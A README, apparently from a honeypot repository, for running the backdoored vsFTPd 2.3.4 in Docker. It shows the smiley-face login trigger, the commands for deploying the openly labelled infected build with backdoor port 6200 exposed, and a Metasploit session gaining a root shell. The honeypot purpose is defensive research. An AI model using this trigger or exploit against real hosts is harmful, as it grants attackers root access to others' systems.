### vsFTPd 2.3.4

As this is in the Honey Net branch, you should assume that it is meant for creation of Honey Pots only. 

You should never expose this build in your actual network unless you take proper precautions.

This is a build for the original backdoored vsFTPd 2.3.4 software.

The way the exploit works is by sending any login string with a smiley face at the end such as:

```
USER nks:)
PASS noclue
```
This will break out a backdoor on port 6200 which you can then connect to and get access to the system.

The way it was backdoored was with rogue functions in 2 .C files and then re-uploaded to the original hosting website, until someone found it.

Since this is a well known vulnerability, it will do well in a Honey Pot, more specifically, it will be useful to filter out typical scanners from someone that is actually trying to exploit your network. 

When this kind of action is logged in whatever solution you want to use, you can blacklist that IP before it continues attacking the rest of your network. 

Since attackers usually go for weaker targets first, they should focus on this kind of application before anything else, which will give you ample time to prepare and blacklist. This can also serve for re-search purposes, as depending on your logging software, you can log what the attacker is doing once they gain access.

INSTRUCTIONS:

1. https://hub.docker.com/r/nksnksnks/vsftpd.2.3.4-vuln-osvdb-73573/

Pull the image from here with:

```
docker pull nksnksnks/vsftpd.2.3.4-vuln-osvdb-73573
```

If this is successfull, skip to step 4 and add the appropriate image name or better yet follow the instructions on the Link above.

If for some reason you can't pull and wan't do to it manually, follow the steps below.

2. Download all of the files from the repository, including the vulnerable application.

The way I do this that is most efficient is right clicking on the Download button for example at the .tar.gz app and clicking on Copy Link Location.

Then you can go to your server and download it via:

```
wget https://github.com/n-ks/Honey-Net/raw/master/FTP/vsFTPd%202.3.4/vsftpd-2.3.4-infected.tar.gz (Re-Do this yourself, the URL here might change)
```

3. Once you have all of your files in one location, extract the .tar.gz with:

```
tar xvf vsftpd-2.3.4-infected.tar.gz
```

4. Everything you need should be there, now can you build your Docker Image:

```
docker build -t vsftpd.2.3.4 .
```

Note that since it will install,update,upgrade stuff this can take a while. (Some errors are also normal, especially in the manual build)

4. After your image is successfully built, you can raise it with:

```
docker run -itd -p 21:21 -p 6200:6200 vsftpd.2.3.4
```

Note that if you do not want this application to be vulnerable and only want attackers to try and break in and not actually succeed you can remove -p 6200:6200. (The actual backdoor port) So basically the Docker will be exploited and will open a 6200 port but not to your host system.

5. To enter your new container and install whatever logging system you want, you can do the following:

```
docker exec -u 0 -it <container-name> bash
```

6. Congratulations, you have a working vulnerable app.

___NOTE: The OS on which this was tested was Ubuntu 16.04 LTS with Docker CE installed.___

___NOTE 2: The image used from Docker Hub is Debian based, so any logging solution that you can think of that will work with Debian will probably work for you, only thing to keep in mind is the ports you'll need to add for said solution.___

___NOTE 3: Make sure you limit your containers resources and security so it doesn't spread on your host in any way.___

Result:

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.1.3
RHOST => 192.168.1.3
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.1.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.3:21 - USER: 331 Please specify the password.
[+] 192.168.1.3:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.4:43985 -> 192.168.1.3:6200) at 2018-05-30 11:58:15 +0200

id
uid=0(root) gid=0(root) groups=0(root)
^C
Abort session 1? [y/N]  y

[*] 192.168.1.3 - Command shell session 1 closed.  Reason: User exit
msf exploit(unix/ftp/vsftpd_234_backdoor) > 
```

I've used one of the more general exploits to get in, with MSF, which was successfull.
